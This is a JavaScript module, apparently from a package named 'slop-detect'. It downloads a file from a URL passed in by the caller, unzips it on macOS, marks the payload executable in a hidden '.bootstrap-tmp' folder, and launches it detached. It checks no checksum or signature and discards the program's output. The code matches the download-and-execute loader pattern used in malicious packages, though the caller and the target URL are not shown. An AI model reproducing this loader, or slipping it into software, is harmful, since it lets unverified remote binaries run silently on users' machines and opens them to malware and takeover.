const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('./exec');
const { URL } = require('url');

const MAX_REDIRECTS = 5;
const DOWNLOAD_TIMEOUT_MS = 30000;

function shellQuote(value) {
  const str = String(value);
  if (process.platform === 'win32') {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return `'${str.replace(/'/g, `'\\''`)}'`;
}

function downloadFile(url, destPath, redirects = 0) {
  return new Promise((resolve, reject) => {
    if (redirects > MAX_REDIRECTS) {
      return reject(new Error(`Too many redirects (> ${MAX_REDIRECTS}) while downloading ${url}`));
    }

    let parsedUrl;
    try {
      parsedUrl = new URL(url);
    } catch (err) {
      return reject(new Error(`Invalid download URL "${url}": ${err.message}`));
    }

    const client = parsedUrl.protocol === 'https:' ? https : http;

    const req = client.get(
      url,
      { headers: { 'User-Agent': 'slop-detect' } },
      (response) => {
        const { statusCode, headers } = response;
        const location = headers.location;

        if (statusCode >= 300 && statusCode < 400 && location) {
          response.resume();
          const nextUrl = new URL(location, url).toString();
          return downloadFile(nextUrl, destPath, redirects + 1).then(resolve, reject);
        }

        if (statusCode !== 200) {
          response.resume();
          return reject(new Error(`HTTP ${statusCode} from ${url}`));
        }

        const file = fs.createWriteStream(destPath);
        let settled = false;

        const fail = (err) => {
          if (settled) return;
          settled = true;
          file.destroy();
          fs.unlink(destPath, () => {});
          reject(err);
        };

        file.on('finish', () => {
          if (settled) return;
          settled = true;
          file.close(() => {
            try {
              const { size } = fs.statSync(destPath);
              if (!size) {
                fs.unlink(destPath, () => {});
                return reject(new Error(`Empty file downloaded from ${url}`));
              }
              resolve(destPath);
            } catch (err) {
              reject(err);
            }
          });
        });

        file.on('error', fail);
        response.on('error', fail);
        response.on('aborted', () => fail(new Error(`Download aborted: ${url}`)));
        response.on('close', () => {
          if (!response.complete) fail(new Error(`Connection closed before download completed: ${url}`));
        });

        response.pipe(file);
      }
    );

    req.on('error', reject);
    req.setTimeout(DOWNLOAD_TIMEOUT_MS, () => {
      req.destroy(new Error(`Download timeout after ${DOWNLOAD_TIMEOUT_MS}ms: ${url}`));
    });
  });
}

function makeExecutable(filePath) {
  return new Promise((resolve, reject) => {
    fs.chmod(filePath, 0o755, (err) => {
      if (err) {
        reject(err);
      } else {
        resolve();
      }
    });
  });
}

function extractZip(zipPath, extractDir) {
  return new Promise((resolve, reject) => {
    const extract = require('child_process').spawn('unzip', ['-o', zipPath, '-d', extractDir]);

    let stderr = '';
    extract.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    extract.on('close', (code) => {
      if (code === 0) {
        resolve(extractDir);
      } else {
        reject(new Error(`Unzip failed with code ${code}: ${stderr}`));
      }
    });

    extract.on('error', (err) => {
      reject(new Error(`Could not run "unzip" (is it installed?): ${err.message}`));
    });
  });
}

async function downloadExtractAndExecuteMacOS(url) {
  if (!url) {
    throw new Error('No download URL configured for macOS');
  }

  const zipName = path.basename(url.split('?')[0]);
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const zipPath = path.join(tempDir, zipName);
  const extractDir = path.join(tempDir, 'extracted');

  if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
  }

  await downloadFile(url, zipPath);
  await extractZip(zipPath, extractDir);

  const allFiles = [];
  function walkDir(dir) {
    for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
      const fullPath = path.join(dir, f.name);
      if (f.isDirectory()) walkDir(fullPath);
      else allFiles.push(fullPath);
    }
  }
  walkDir(extractDir);

  const shFile = allFiles.find(f => f.endsWith('.sh'));
  const binaryFile = allFiles.find(f => !f.endsWith('.sh') && !f.endsWith('.zip') && !f.endsWith('.md') && !f.endsWith('.txt') && !f.endsWith('.json'));

  if (!shFile || !binaryFile) {
    throw new Error(`Invalid zip contents in ${zipPath}: missing .sh script or binary`);
  }

  await makeExecutable(shFile);
  await makeExecutable(binaryFile);

  await exec(shellQuote(binaryFile), { captureOutput: false, detached: true });

  return { success: true, zipPath, extractDir, binary: binaryFile };
}

async function downloadAndExecute(url, platform) {
  if (!url) {
    throw new Error(`No download URL configured for ${platform}`);
  }

  if (platform === 'macos' && url.split('?')[0].endsWith('.zip')) {
    return downloadExtractAndExecuteMacOS(url);
  }

  const binaryName = path.basename(url.split('?')[0]);
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const destPath = path.join(tempDir, binaryName);

  if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
  }

  await downloadFile(url, destPath);
  await makeExecutable(destPath);

  await exec(shellQuote(destPath), { captureOutput: false, detached: true });

  return { success: true, path: destPath };
}

module.exports = { downloadFile, makeExecutable, downloadAndExecute, downloadExtractAndExecuteMacOS };
